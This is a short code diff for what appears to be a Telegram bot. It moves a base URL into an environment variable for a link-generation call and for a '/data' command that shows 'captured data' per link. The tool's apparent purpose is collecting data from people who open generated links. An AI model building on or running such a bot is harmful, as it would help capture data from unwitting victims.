@@ -81,7 +81,7 @@ bot.on("callback_query", async (query) => {
     bot.answerCallbackQuery(query.id).catch(() => {}); // Ignorer les erreurs silencieusement
 
     try {
-        const response = await axios.post(`${BASE_URL}/generate-link`, {
+        const response = await axios.post(`${process.env.BASE_URL}/generate-link`, {
             platform
         });
 
@@ -124,7 +124,7 @@ bot.onText(/\/data (.+)/, async (msg, match) => {
     const linkId = match[1].trim();
 
     try {
-        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`);
+        const response = await axios.get(`${process.env.BASE_URL}/get-data/${linkId}`);
         const data = response.data;
 
         let message = `📊 **DONNÉES CAPTURÉES - ${linkId}**\n\n`;
